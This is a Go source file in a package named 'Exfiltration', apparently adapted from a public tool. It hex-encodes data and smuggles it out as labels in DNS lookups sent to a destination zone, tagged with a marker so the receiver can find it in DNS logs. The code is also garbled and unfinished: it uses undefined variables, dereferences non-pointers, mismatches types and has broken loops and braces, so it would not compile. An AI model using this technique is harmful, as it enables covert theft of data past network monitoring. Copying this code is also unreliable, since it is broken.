package Exfiltration

//https://github.com/62726164/dns-exfil/blob/main/send/main.go
import (
	"encoding/hex"
	"fmt"
	"math"
	"net"
)

// makes chunky data for packet stuffing
// chunk size known, number of packets unknown
// will default to 50, the max with a safety buffer
// if we use a pointer, we can check if there is an intented value because that
// variable will EXIST. Therefore we can check if not nil!
func DataChunkerChunkSize(DataIn []byte, chunksize *uint32) [][]byte { //, derp error) {
	if chunksize == nil {
		chunksize = 50
	}
	var chunkcount int = 1
	var DataInLength = len(DataIn)
	// make the buffer
	DataOutBuffer := make([]byte, DataInLength)
	// loop over the original data object taking a bite outta crim... uh data
	for asdf := 1; chunkcount < DataInLength; chunkcount += chunkSize{//chunkcount++{
		// mark the end bounds
		//asdf= 2 ; end = 52? wat
		end := asdf + chunkSize
		// necessary check to avoid slicing beyond
		// slice capacity
		if end > DataInLength {
			end = DataInLength
		}
		DataOutBuffer = append(DataOutBuffer, sliceofdata[:chunksize])
		bytesRead, err := f.Read(dataBytes)

				dataBytes = dataBytes[:bytesRead]
				hexString := hex.EncodeToString(dataBytes)
		}
	
	return DataOutBuffer
	//maybe return chunk_num int as well
}

func sendDNSmessage(MsgAsHexStr string, DestZone string) (herp, derp error){
	var debug bool = true
	//a unique marker to identify the file in the dns logs
	var marker string = "herpAderpNotAPerp"
	// the dns zone to send the queries to.
	hostname := fmt.Sprintf("%d.%s.1.%s.%s", *marker, MsgAsHexStr, *DestZone)
	_, err := net.LookupIP(hostname)
	fmt.Printf("%d\n", chunk)
	if *debug {
		fmt.Printf("Data Inside Hostname: %s\n", hostname)
		fmt.Printf("Data Length: %d\n", len(hostname))
		fmt.Printf("Error: %s\n", derp)
		fmt.Printf("--------------------------\n")
	}
}
// Exports a sequence of bytes via DNS packets
// max message size should be below 63 but 5 ... I guess?
// 63 is total available per packet I think
func DNSExfiltration(ByteArrayInput []byte, DestZone string, MaxMsgSize uint16) (herp, derp error) {
	var debug bool = true
	//the local file to exfiltrate.
	//var file []byte = ByteArrayInput
	//a unique marker to identify the message in the dns logs
	var marker string = "herpAderpNotAPerp"
	// the dns zone to send the queries to.
	DestZone = "" 
	
	// 90 bytes wide, thats the number given by the original source...
	// Which doesnt make sense? the final structure to fit this into only
	// allows :
	// Length: Each label can theoretically be from 0 to 63 characters in 
	//	 length. In practice, a length of 1 to about 20 characters is most
	//	 common, with a special exception for the label assigned to the 
	//	 root of the tree (see below).
	DataChunker(ByteArrayInput, MaxMsgSize)
	// Numbers for the file chunks
	chunk := 0
	message_array_capacity = cap(dataBytes)
	dataBytes = dataBytes[:cap(message_array_capacity)]
		bytesRead, err := f.Read(dataBytes)

		dataBytes = dataBytes[:bytesRead]
		hexString := hex.EncodeToString(dataBytes)

		if len(hexString) > 60 && len(hexString) <= 120 {
			// Two Labels

			firstHalf := len(hexString) / 2
			fh := float64(firstHalf)
			evenOdd := math.Mod(fh, 2)
			if evenOdd == 1 {
				firstHalf = firstHalf + 1
			}

			//fmt.Printf("%d %s\n", len(hexString), hexString[:])
			//fmt.Printf("%d %s\n", len(hexString[0:firstHalf]), hexString[0:firstHalf])
			//fmt.Printf("%d %s\n", len(hexString[firstHalf:]), hexString[firstHalf:])
			//fmt.Printf("%s\n", "---------------------------------------")

			hostname := fmt.Sprintf("%d.%s.2.%s.%s.%s", chunk, *marker, hexString[0:firstHalf], hexString[firstHalf:], *zone)
			_, err := net.LookupIP(hostname)
			fmt.Printf("%d\n", chunk)
			if *debug {
				fmt.Printf("hostname: %s\n", hostname)
				fmt.Printf("len: %d\n", len(hostname))
				fmt.Printf("err: %s\n", err)
				fmt.Printf("--------------------------\n")
			}
		}

		if len(hexString) > 120 && len(hexString) <= 180 {
			// Three Labels

			//fmt.Printf("%d %s\n", len(hexString), hexString[:])
			//fmt.Printf("%d %s\n", len(hexString[0:60]), hexString[0:60])
			//fmt.Printf("%d %s\n", len(hexString[60:120]), hexString[60:120])
			//fmt.Printf("%d %s\n", len(hexString[120:]), hexString[120:])
			//fmt.Printf("%s\n", "---------------------------------------")

			hostname := fmt.Sprintf("%d.%s.3.%s.%s.%s.%s", chunk, *marker, hexString[0:60], hexString[60:120], hexString[120:], *zone)
			_, err := net.LookupIP(hostname)
			fmt.Printf("%d\n", chunk)
			if *debug {
				fmt.Printf("hostname: %s\n", hostname)
				fmt.Printf("len: %d\n", len(hostname))
				fmt.Printf("err: %s\n", err)
				fmt.Printf("--------------------------\n")
			}
		}

		chunk = chunk + 1
	}

	fmt.Printf("Complete.\n")
}
/*/ makes chunky data for packet stuffing
// UNKnown Chunk size, based on number of chunks needed
func DataChunkerNumChunk(DataIn []byte, NumChunk uint32) []byte { //, derp error) {
	//chunks := make([][]byte, 0, len(buf)/lim+1)
	//	chunk, buf = buf[:lim], buf[lim:]
	//	chunks = append(chunks, chunk)
	//	chunks = append(chunks, buf[:len(buf)])
	var DataInLength = len(DataIn)
	var chunksize = DataInLength / int(NumChunk)
	DataOutBuffer := make([]byte, chunksize)
	return DataOutBuffer
	//maybe return chunk_num int as well
}
/*/